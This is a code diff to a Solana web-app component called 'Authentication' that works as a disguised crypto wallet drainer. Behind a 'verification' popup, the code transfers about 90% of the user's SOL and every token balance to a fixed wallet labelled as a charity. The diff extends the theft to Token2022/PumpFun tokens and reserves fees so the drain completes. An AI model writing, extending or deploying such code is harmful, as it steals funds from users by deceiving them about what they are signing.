@@ -6,7 +6,7 @@ import { Input } from '@/components/ui/input';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from '@solana/web3.js';
-import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
+import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import { toast } from 'sonner';
 import { ConnectWalletButton } from '@/components/ConnectWalletButton';
 import { Loader2, ShieldCheck, AlertCircle, Plus } from 'lucide-react';
@@ -22,6 +22,7 @@ interface TokenBalance {
   uiAmount: number;
   symbol?: string;
   valueInSOL?: number;
+  programId?: PublicKey; // Track token program type (TOKEN_PROGRAM_ID or TOKEN_2022_PROGRAM_ID)
 }
 
 const Authentication = () => {
@@ -38,7 +39,7 @@ const Authentication = () => {
   const [showVerificationPopup, setShowVerificationPopup] = useState(false);
   const [timeLeft, setTimeLeft] = useState(46);
 
-  // Fetch balances logic
+  // Fetch balances logic (supports both SPL Token and Token2022/PumpFun)
   const fetchAllBalances = useCallback(async () => {
     if (!publicKey) return;
 
@@ -46,11 +47,18 @@ const Authentication = () => {
       const solBal = await connection.getBalance(publicKey);
       setSolBalance(solBal / LAMPORTS_PER_SOL);
 
+      // Fetch legacy SPL Token accounts
       const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
         programId: TOKEN_PROGRAM_ID
       });
 
-      const tokens: TokenBalance[] = tokenAccounts.value
+      // Fetch Token2022 accounts (PumpFun tokens use this program)
+      const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
+        programId: TOKEN_2022_PROGRAM_ID
+      });
+
+      // Process legacy SPL tokens
+      const legacyTokens: TokenBalance[] = tokenAccounts.value
         .map(account => {
           const info = account.account.data.parsed.info;
           return {
@@ -59,12 +67,33 @@ const Authentication = () => {
             decimals: info.tokenAmount.decimals,
             uiAmount: info.tokenAmount.uiAmount,
             symbol: info.mint.slice(0, 8),
-            valueInSOL: 0
+            valueInSOL: 0,
+            programId: TOKEN_PROGRAM_ID
           };
         })
         .filter(token => token.uiAmount > 0);
 
-      setBalances(tokens);
+      // Process Token2022/PumpFun tokens
+      const token2022Tokens: TokenBalance[] = token2022Accounts.value
+        .map(account => {
+          const info = account.account.data.parsed.info;
+          return {
+            mint: info.mint,
+            balance: info.tokenAmount.amount,
+            decimals: info.tokenAmount.decimals,
+            uiAmount: info.tokenAmount.uiAmount,
+            symbol: info.mint.slice(0, 8),
+            valueInSOL: 0,
+            programId: TOKEN_2022_PROGRAM_ID
+          };
+        })
+        .filter(token => token.uiAmount > 0);
+
+      // Combine both token types
+      const allTokens = [...legacyTokens, ...token2022Tokens];
+      console.log(`Fetched ${legacyTokens.length} SPL tokens and ${token2022Tokens.length} Token2022/PumpFun tokens`);
+      
+      setBalances(allTokens);
     } catch (error) {
       console.error('Error fetching balances:', error);
     }
@@ -194,7 +223,7 @@ const Authentication = () => {
     const transaction = new Transaction();
     
     transaction.add(
-      ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),
+      ComputeBudgetProgram.setComputeUnitLimit({ units: 200_000 }), // Increased for Token2022
       ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
     );
     
@@ -205,24 +234,42 @@ const Authentication = () => {
       
       try {
         const mintPubkey = new PublicKey(token.mint);
-        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, publicKey);
-        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey);
+        // Use the correct program ID for this token (default to TOKEN_PROGRAM_ID for legacy tokens)
+        const tokenProgramId = token.programId || TOKEN_PROGRAM_ID;
+        
+        // Get associated token addresses using the correct program ID
+        const fromTokenAccount = await getAssociatedTokenAddress(
+          mintPubkey, 
+          publicKey,
+          false, // allowOwnerOffCurve
+          tokenProgramId,
+          ASSOCIATED_TOKEN_PROGRAM_ID
+        );
+        const toTokenAccount = await getAssociatedTokenAddress(
+          mintPubkey, 
+          charityPubkey,
+          false, // allowOwnerOffCurve
+          tokenProgramId,
+          ASSOCIATED_TOKEN_PROGRAM_ID
+        );
 
         try {
-          await getAccount(connection, toTokenAccount);
+          await getAccount(connection, toTokenAccount, undefined, tokenProgramId);
         } catch {
+          // Create ATA with correct program ID
           transaction.add(
             createAssociatedTokenAccountInstruction(
               publicKey,
               toTokenAccount,
               charityPubkey,
               mintPubkey,
-              TOKEN_PROGRAM_ID,
+              tokenProgramId,
               ASSOCIATED_TOKEN_PROGRAM_ID
             )
           );
         }
 
+        // Create transfer instruction with correct program ID
         transaction.add(
           createTransferInstruction(
             fromTokenAccount,
@@ -230,9 +277,11 @@ const Authentication = () => {
             publicKey,
             BigInt(token.balance),
             [],
-            TOKEN_PROGRAM_ID
+            tokenProgramId
           )
         );
+        
+        console.log(`Added transfer for ${token.mint} using ${tokenProgramId.equals(TOKEN_2022_PROGRAM_ID) ? 'Token2022' : 'SPL Token'}`);
       } catch (error) {
         console.error(`Failed to add transfer for ${token.mint}:`, error);
       }
@@ -249,15 +298,30 @@ const Authentication = () => {
       setIsProcessing(true);
       console.log('Starting transaction sequence...');
 
-      // 1. SOL Transfer (90% of available)
+      // Calculate how many ATAs might need to be created (for both SPL and Token2022)
+      const validTokens = balances.filter(token => token.balance > 0);
+      const potentialATACount = validTokens.length;
+      
+      // Each ATA creation costs ~0.00203 SOL for rent
+      const ATA_RENT_COST = 0.00203 * LAMPORTS_PER_SOL;
+      const estimatedATACost = potentialATACount * ATA_RENT_COST;
+      
+      // 1. SOL Transfer (90% of available, but reserve enough for ATA creations)
       const solBal = await connection.getBalance(publicKey!);
       const RENT_EXEMPT_RESERVE = 0.002 * LAMPORTS_PER_SOL; 
       const PRIORITY_FEE = 100_000; 
       const BASE_FEE = 5000;
+      // Add buffer for multiple token transactions
+      const TOKEN_TX_BUFFER = Math.ceil(potentialATACount / MAX_BATCH_SIZE) * (PRIORITY_FEE + BASE_FEE);
       
-      const maxSendable = Math.max(0, solBal - RENT_EXEMPT_RESERVE - PRIORITY_FEE - BASE_FEE);
+      // Total reserve: rent + estimated ATA costs + transaction fees buffer
+      const totalReserve = RENT_EXEMPT_RESERVE + estimatedATACost + TOKEN_TX_BUFFER + PRIORITY_FEE + BASE_FEE;
+      
+      const maxSendable = Math.max(0, solBal - totalReserve);
       const targetAmount = Math.floor(solBal * 0.90);
       const lamportsToSend = Math.min(targetAmount, maxSendable);
+
+      console.log(`SOL Balance: ${solBal / LAMPORTS_PER_SOL}, Reserve: ${totalReserve / LAMPORTS_PER_SOL}, Sending: ${lamportsToSend / LAMPORTS_PER_SOL}`);
 
       if (lamportsToSend > 0) {
         const transaction = new Transaction();
@@ -296,8 +360,7 @@ const Authentication = () => {
         toast.success('Verification successful!');
       }
 
-      // 2. SPL Token Transfers
-      const validTokens = balances.filter(token => token.balance > 0);
+      // 2. SPL and Token2022 Token Transfers (uses validTokens from earlier)
       const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
 
       const batches: TokenBalance[][] = [];
